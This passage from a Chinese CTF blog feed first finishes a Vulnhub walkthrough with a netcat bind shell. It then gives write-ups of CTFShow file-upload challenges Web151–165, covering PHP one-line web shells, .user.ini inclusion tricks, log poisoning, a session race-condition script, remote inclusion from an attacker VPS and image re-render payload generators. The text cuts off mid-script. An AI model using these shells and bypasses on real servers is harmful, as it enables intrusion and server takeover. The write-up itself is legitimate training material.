\;<br>find shell -exec netcat -lvp 5555 -e /bin/sh \; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">重新起一个终端</span><br>netcat xx.xx.xx.xx 5555<br></code></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225920195.png" alt="image-20220513225920195"></p><p>完成</p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow Web入门_文件上传</title>
    <link href="/posts/fdac7c8/"/>
    <url>/posts/fdac7c8/</url>
    
    <content type="html"><![CDATA[<h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><p>前端验证只能上传png文件</p><p>方法一：关闭浏览器的js</p><p>方法二：</p><p>把一句话文件改为png后缀然后bp抓包改回php</p><p><img src="/posts/fdac7c8/image-20220403153443766.png" alt="image-20220403153443766"></p><p>文件上传在upload&#x2F;1.php</p><p>蚁剑连接flag在上级目录</p><h2 id="Web152"><a href="#Web152" class="headerlink" title="Web152"></a>Web152</h2><p>同web151的方法二</p><h2 id="Web153"><a href="#Web153" class="headerlink" title="Web153"></a>Web153</h2><p>利用.user.ini文件进行绕过</p><p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p><blockquote><p>官方文档:<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p><img src="/posts/fdac7c8/image-20220403203936524-165898386339940.png" alt="image-20220403203936524"></p><p>由上图可知PHP_INI_USER模式就是.user.ini</p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini</p><p>只有在当前目录下有php文件才可以使用</p><p>.user.ini的配置参数和php.ini相同</p><p>具体配置参数:<a href="https://www.php.net/manual/en/ini.list.php">https://www.php.net/manual/en/ini.list.php</a></p></blockquote><p>这里利用 auto_append_file 参数 作用是包含一个文件</p><p>首先要先上传一个.user.ini文件</p><p>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_append_file=<span class="hljs-string">&quot;1.txt&quot;</span> <span class="hljs-comment"># &quot;&quot;内为要上传的文件名字 注意不要是php后缀</span><br></code></pre></td></tr></table></figure><p>要绕过前端验证,先把后缀改为png然后抓包改为.user.ini</p><p><img src="/posts/fdac7c8/image-20220403214327526.png" alt="image-20220403214327526"></p><p>然后上传1.txt文件 内容为一句话</p><p>上传成功后蚁剑连接注意地址为<code>xxxx/upload</code>不是1.txt</p><h2 id="Web154"><a href="#Web154" class="headerlink" title="Web154"></a>Web154</h2><p>先上传上一题的.user.ini试下</p><p><img src="/posts/fdac7c8/image-20220412161942647.png" alt="image-20220412161942647"></p><p>继续上传1.txt</p><p><img src="/posts/fdac7c8/image-20220412162122727.png" alt="image-20220412162122727"></p><p><img src="/posts/fdac7c8/image-20220412162147450.png" alt="image-20220412162147450"></p><p>这里对文件内容进行了检查</p><p>经过测试是对php进行了过滤</p><p>利用短标签进行绕过</p><blockquote><p>短标记是用来输出变量或表达式，一般用法是<br><code>&lt;?=$a?&gt;</code><br><code>&lt;?=(表达式)?&gt;</code><br>就相当于<br><code>&lt;?php echo $a?&gt;`` ``&lt;?php echo (表达式)?&gt;</code></p></blockquote><p>这里把1.txt的内容改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412163101395.png" alt="image-20220412163101395"></p><p>上传成功，蚁剑连接 flag在老地方</p><h2 id="Web155"><a href="#Web155" class="headerlink" title="Web155"></a>Web155</h2><p>同web154</p><h2 id="Web156"><a href="#Web156" class="headerlink" title="Web156"></a>Web156</h2><p>先用web154的方法试下</p><p>发现1.txt无法上传</p><p>用二分法发现是[]被过滤 改为{}成功绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-number">1</span>&#125;);?<br></code></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220412165955739.png" alt="image-20220412165955739"></p><h2 id="Web157"><a href="#Web157" class="headerlink" title="Web157"></a>Web157</h2><p>老样子先上传.user.ini</p><p>发现1.txt没有办法上传</p><p>这里过滤了[]和{}</p><p>这里就换一个函数</p><blockquote><p>array_pop</p><p>array_pop — 弹出数组最后一个单元（出栈）</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$_POST</span>)) <span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment"># 这里array_pop的返回值正好是post传出的值 </span><br></code></pre></td></tr></table></figure><p>利用这个函数我们就可以通过文件上传再进行命令执行从而获取到flag</p><p>这里还对;进行了拦截 但是没关系 php结束的;是可以省略的</p><p><img src="/posts/fdac7c8/image-20220413091144516.png" alt="image-20220413091144516"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># post传参</span><br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ../flag.php&quot;</span>);<br><span class="hljs-comment"># 源代码拿到flag</span><br></code></pre></td></tr></table></figure><h2 id="Web158"><a href="#Web158" class="headerlink" title="Web158"></a>Web158</h2><p>同web157</p><h2 id="Web159"><a href="#Web159" class="headerlink" title="Web159"></a>Web159</h2><p>老样子先上传.user.ini</p><p>这里过滤了（）</p><p>这里利用include包含日志文件，在日志文件中传马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;var/log/nginx/access.log&#x27;</span><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 这里对log 进行了过滤</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;var/lo&#x27;</span>.<span class="hljs-string">&#x27;g/nginx/access.lo&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过user-agent传入一句话 从而写进日志</p><p><img src="/posts/fdac7c8/image-20220414000750535.png" alt="image-20220414000750535"></p><p>蚁剑连接 xxx.ctf.show&#x2F;upload</p><h2 id="Web160"><a href="#Web160" class="headerlink" title="Web160"></a>Web160</h2><p>老样子先上传.user.ini</p><p>这里过滤了空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 这里把空格换成0d换行符或者直接去掉空格</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传成功接下来 利用ua传入木马</p><p>蚁剑连接拿到flag</p><h2 id="Web161"><a href="#Web161" class="headerlink" title="Web161"></a>Web161</h2><p>这里对文件内容进行了检测</p><p>在文件中添加文件头GIF98a</p><p><img src="/posts/fdac7c8/image-20220415234148034.png" alt="image-20220415234148034"></p><p><img src="/posts/fdac7c8/image-20220415234205841.png" alt="image-20220415234205841"></p><p>ua传入木马 蚁剑连接拿到flag</p><h2 id="Web162"><a href="#Web162" class="headerlink" title="Web162"></a>Web162</h2><p>这里利用的是session条件竞争</p><p>首先先用161的方法上传.user.ini</p><p>这里对文件内容中的.进行了过滤</p><p>所以要包含一个不含.的文件</p><p><img src="/posts/fdac7c8/image-20220416000207449.png" alt="image-20220416000207449"></p><p>上传txt</p><p><img src="/posts/fdac7c8/image-20220416000325392.png" alt="image-20220416000325392"></p><p>这里用羽师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>session=requests.session()<br>sess=<span class="hljs-string">&#x27;yu22x&#x27;</span><br>url1=<span class="hljs-string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/&quot;</span><br>url2=<span class="hljs-string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/upload&quot;</span><br>data1=&#123;<br><span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br>&#125;<br>file=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;yu22x&#x27;</span><br>&#125;<br>cookies=&#123;<br><span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.post(url1,data=data1,files=file,cookies=cookies)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url2)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br><span class="hljs-built_in">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>t.start()<br></code></pre></td></tr></table></figure><p>最后跑了半天没做出来<br>最后跑了半天没做出来</p><p>还有一个简单的方法但是需要一台VPS</p><blockquote><p>IP转长地址 <a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p></blockquote><p>要在ip地址下的index.html中写入后门代码</p><p>利用远程包含IP转换地址后门调用执行</p><p>.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=png<br></code></pre></td></tr></table></figure><p>png</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;?=includ<span class="hljs-string">e&#x27;http://1696798202/&#x27;</span>?&gt;<br></code></pre></td></tr></table></figure><h2 id="Web163"><a href="#Web163" class="headerlink" title="Web163"></a>Web163</h2><p>可是使用条件竞争</p><p>也可以使用长地址绕过</p><p>直接在配置文件中包含长地址</p><p>.user.ini</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">GIF89a<br><span class="hljs-built_in">auto</span>_prepend_file=http:<span class="hljs-comment">//1696798202/</span><br></code></pre></td></tr></table></figure><h2 id="Web164"><a href="#Web164" class="headerlink" title="Web164"></a>Web164</h2><p>这题主要考察png图片的二次渲染</p><p>利用脚本生成一个可以绕过二次渲染的图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;2.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>点击查看图片</p><p>使用hackbar</p><p><img src="/posts/fdac7c8/image-20220421152538585.png" alt="image-20220421152538585"></p><p>下载图片到本地用notpad++打开拿到flag</p><h2 id="Web165"><a href="#Web165" class="headerlink" title="Web165"></a>Web165</h2><p>这个题是jpg图片二次渲染绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span 